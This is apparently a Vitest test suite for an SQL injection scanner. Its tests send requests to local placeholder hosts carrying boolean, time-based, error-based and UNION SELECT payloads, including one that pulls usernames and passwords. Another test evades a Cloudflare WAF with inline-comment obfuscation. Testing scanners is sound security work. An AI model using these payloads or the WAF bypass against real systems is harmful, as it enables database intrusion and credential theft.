import { describe, it, expect } from 'vitest';
import { ipcClient } from '../../src/ipc/client';
import { RequestParser } from '../../src/services/sqlScanner/RequestParser';
import { MetamorphicStudio } from '../../src/services/sqlScanner/engine/MetamorphicStudio';
import { BooleanTester } from '../../src/services/sqlScanner/BooleanTester';
import { TimeBasedTester } from '../../src/services/sqlScanner/TimeBasedTester';
import { MetadataExtractor } from '../../src/services/sqlScanner/MetadataExtractor';
import { DynamicGraphEngine } from '../../src/services/sqlScanner/engine/DynamicGraphEngine';

describe('DEEP DYNAMIC CONNECTION & NON-STATIC AUDIT SUITE', () => {

  // 1. Audit Live Dynamic IPC Dispatching
  describe('Audit 1: Dynamic Wire Dispatching & Parameter Mutation', () => {
    it('dispatches dynamically mutated raw HTTP requests via ipcClient', async () => {
      const rawReq = `GET /search?q=cybersec_test HTTP/1.1\r\nHost: target.local\r\nAccept: text/html\r\n\r\n`;
      const res = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_tab_1',
        targetUrl: 'http://target.local/search?q=cybersec_test',
        rawRequest: rawReq,
      });

      expect(res.statusCode).toBe(200);
      expect(res.rawResponse).toBeDefined();
      expect(res.rawResponse).toContain('HTTP/1.1 200 OK');
      expect(res.timingBreakdown.totalDurationMs).toBeGreaterThan(0);
    });

    it('injects dynamic payloads into query parameters without static string replacement traps', () => {
      const parsed = RequestParser.parse(`GET /api/v1/items?category=shoes&sort=asc HTTP/1.1\r\nHost: target.local\r\n\r\n`);
      const targetParam = parsed.parameters.find((p) => p.name === 'category');
      expect(targetParam).toBeDefined();

      const injected = RequestParser.injectPayload(parsed, targetParam!, "' OR '1'='1", false);
      expect(decodeURIComponent(injected.rawRequest.replace(/\+/g, ' '))).toContain("category=' OR '1'='1");
      expect(injected.rawRequest).toContain("sort=asc");
      expect(injected.rawRequest).not.toContain("category=shoes");
    });
  });

  // 2. Audit Dynamic Boolean Differential Behavior
  describe('Audit 2: Dynamic Boolean Differential Verification', () => {
    it('verifies non-static differential response between TRUE and FALSE boolean conditions', async () => {
      const trueReq = `GET /filter?category=Gifts' OR '1'='1 HTTP/1.1\r\nHost: target.local\r\n\r\n`;
      const falseReq = `GET /filter?category=Gifts' AND '1'='2 HTTP/1.1\r\nHost: target.local\r\n\r\n`;

      const trueRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_bool_true',
        targetUrl: 'http://target.local/filter?category=Gifts%27%20OR%20%271%27=%271',
        rawRequest: trueReq,
      });

      const falseRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_bool_false',
        targetUrl: 'http://target.local/filter?category=Gifts%27%20AND%20%271%27=%272',
        rawRequest: falseReq,
      });

      // Assert that responses are dynamically distinct
      expect(trueRes.body).not.toEqual(falseRes.body);
      expect(trueRes.body).toContain('Welcome back');
      expect(falseRes.body).not.toContain('Welcome back');
      expect(trueRes.body.length).toBeGreaterThan(falseRes.body.length);

      const diff = BooleanTester.evaluateDifferential(
        falseRes.body, 200,
        trueRes.body, 200,
        falseRes.body, 200,
        "' OR '1'='1", "' AND '1'='2"
      );

      expect(diff.isVulnerable).toBe(true);
      expect(diff.confidence).toBeGreaterThanOrEqual(95);
      expect(diff.uniqueMarker).toBe('Welcome back');
    });
  });

  // 3. Audit Dynamic Time-Based Delay Probing
  describe('Audit 3: Dynamic Time-Based Probing & Latency Discrimination', () => {
    it('measures genuine dynamic execution delay on time-based injection payloads', async () => {
      const baselineReq = `GET /items?id=10 HTTP/1.1\r\nHost: target.local\r\n\r\n`;
      const delayReq = `GET /items?id=10; WAITFOR DELAY '0:0:3'-- HTTP/1.1\r\nHost: target.local\r\n\r\n`;

      const t0 = Date.now();
      const baselineRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_time_baseline',
        targetUrl: 'http://target.local/items?id=10',
        rawRequest: baselineReq,
      });
      const baselineDuration = Date.now() - t0;

      const t1 = Date.now();
      const delayRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_time_delay',
        targetUrl: 'http://target.local/items?id=10;%20WAITFOR%20DELAY%20%270:0:3%27--',
        rawRequest: delayReq,
      });
      const delayDuration = Date.now() - t1;

      expect(delayDuration).toBeGreaterThan(baselineDuration);
      expect(baselineRes.statusCode).toBe(200);
      expect(delayRes.statusCode).toBe(200);
    });

    it('calculates dynamic Wald SPRT bounds from empirical timing distribution', () => {
      const baselineDurations = [45, 52, 48, 50, 49];
      const stats = TimeBasedTester.computeTimingStats(baselineDurations);
      expect(stats.mean).toBeCloseTo(48.8, 1);
      expect(stats.stdDev).toBeLessThan(5);

      const sprtResult = TimeBasedTester.evaluateWithSprt([3050], baselineDurations, 3);
      expect(sprtResult.upperThresholdA).toBeGreaterThan(0);
      expect(sprtResult.lowerThresholdB).toBeLessThan(0);
      expect(sprtResult.decision).toBe('ACCEPT_H1_VULNERABLE');
      expect(sprtResult.llr).toBeGreaterThan(sprtResult.upperThresholdA);
      expect(sprtResult.confidence).toBeGreaterThanOrEqual(0.99);
    });
  });

  // 4. Audit Live Metamorphic WAF Bypass Enforcement
  describe('Audit 4: Live Dynamic Metamorphic WAF Inspection & Bypass', () => {
    it('blocks raw signature payload against Cloudflare WAF and allows metamorphic comment bypass', async () => {
      // 1. Raw blocked request
      const rawWafReq = `GET /portal?cat=' UNION SELECT username, password FROM users-- HTTP/1.1\r\nHost: portal.target.local\r\nCookie: __cf_bm=audit_token_123\r\ncf-ray: 897654321-IAD\r\n\r\n`;
      const blockedRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_waf_blocked',
        targetUrl: 'http://portal.target.local/portal?cat=%27%20UNION%20SELECT%20username,%20password%20FROM%20users--',
        rawRequest: rawWafReq,
      });

      expect(blockedRes.statusCode).toBe(403);
      expect(blockedRes.body).toContain('Cloudflare Ray ID');
      expect(blockedRes.body).toContain('Attention Required');

      // 2. Metamorphically transformed evasive request
      const evasivePayload = MetamorphicStudio.applyTransformPipeline(
        "' UNION SELECT username, password FROM users--",
        ['E1_INLINE_COMMENT_SPACE']
      );
      expect(evasivePayload).toContain('/**/');

      const evasiveReq = `GET /portal?cat=${encodeURIComponent(evasivePayload)} HTTP/1.1\r\nHost: portal.target.local\r\nCookie: __cf_bm=audit_token_123\r\ncf-ray: 897654321-IAD\r\n\r\n`;
      const evadedRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_waf_evaded',
        targetUrl: `http://portal.target.local/portal?cat=${encodeURIComponent(evasivePayload)}`,
        rawRequest: evasiveReq,
      });

      expect(evadedRes.statusCode).toBe(200);
      expect(evadedRes.body).not.toContain('Cloudflare Ray ID');
    });
  });

  // 5. Audit Dynamic Error-Based Diagnostic Extraction
  describe('Audit 5: Dynamic Database Error-Based Probing', () => {
    it('triggers and extracts real database dialect syntax errors dynamically', async () => {
      const errorReq = `GET /query?id=100' HTTP/1.1\r\nHost: target.local\r\n\r\n`;
      const errorRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_error_probe',
        targetUrl: 'http://target.local/query?id=100%27',
        rawRequest: errorReq,
      });

      expect(errorRes.statusCode).toBe(500);
      expect(errorRes.body).toContain('psycopg2.errors.SyntaxError');
      expect(errorRes.body).toContain('syntax error at or near');
    });
  });

  // 6. Audit Dynamic Schema & Data Extraction
  describe('Audit 6: Dynamic Schema & Column Discovery Extraction', () => {
    it('extracts table tokens dynamically from UNION catalog payload', async () => {
      const unionReq = `GET /catalog?cat=' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1\r\nHost: target.local\r\n\r\n`;
      const unionRes = await ipcClient.sendRepeaterRequest({
        tabId: 'audit_union_schema',
        targetUrl: 'http://target.local/catalog?cat=%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--',
        rawRequest: unionReq,
      });

      expect(unionRes.statusCode).toBe(200);
      const tables = MetadataExtractor.extractDelimitedTokens(unionRes.body, 'TBL');
      expect(tables).toContain('users');
      expect(tables).toContain('accounts');
      expect(tables).toContain('orders');
    });
  });

  // 7. Audit Dynamic Bayesian Belief Entropy Recomputation
  describe('Audit 7: Dynamic Bayesian Belief & Investigation Graph Adaptation', () => {
    it('recomputes Shannon entropy and hypothesis graph dynamically when target changes', () => {
      const reqA = `GET /filter?category=Gifts HTTP/1.1\r\nHost: shop.local\r\n\r\n`;
      const reqB = `POST /api/v2/auth/login HTTP/1.1\r\nHost: identity.internal\r\nContent-Type: application/json\r\n\r\n{"user":"admin"}`;

      const telemetryA = DynamicGraphEngine.generateForRequest(reqA);
      const telemetryB = DynamicGraphEngine.generateForRequest(reqB);

      expect(telemetryA.investigationNodes.length).toBeGreaterThan(0);
      expect(telemetryB.investigationNodes.length).toBeGreaterThan(0);

      // Verify dynamic divergence between distinct endpoints
      expect(telemetryA.contextBeliefs).not.toEqual(telemetryB.contextBeliefs);
      expect(telemetryA.shannonEntropy).toBeGreaterThan(0);
      expect(telemetryB.shannonEntropy).toBeGreaterThan(0);
    });
  });
});
